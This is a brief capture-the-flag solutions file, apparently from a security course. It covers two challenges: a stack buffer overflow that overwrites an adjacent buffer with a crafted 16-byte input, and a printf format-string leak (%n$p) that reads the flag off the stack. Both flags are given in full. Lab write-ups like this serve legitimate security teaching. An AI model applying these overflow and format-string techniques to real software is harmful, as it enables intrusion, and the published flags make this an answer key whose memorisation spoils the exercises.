# Solutions

## Don't forget the lyrics
The struct `buf` and `lyrics` is organsied sequentially:
```cpp
struct {
    buf char[16]
    lyrics char[16]
}
```
Input `1234567890123456desert` to fill `buf` and set `lyrics` to `desert`.

Flag: `CZ4067{b0f_w1ll_n3v3r_l3t_y0u_d0wn}`

## Echo Chamber 1
`%n$p` prints the word (64 bits in hex) n steps away from the top of the stack.

`$p` reads 1 word at a time, each word is reversed.
```
62 7b 37 36 30 34 5a 43
75 66 33 72 34 63 5f 33
70 5f 68 37 31 77 5f 6c
7d 66 74 6e 31 72
```
`b{7604ZCuf3r4c_3p_h71w_l}ftn1r`

Flag: `CZ4067{b3_c4r3ful_w17h_pr1ntf}`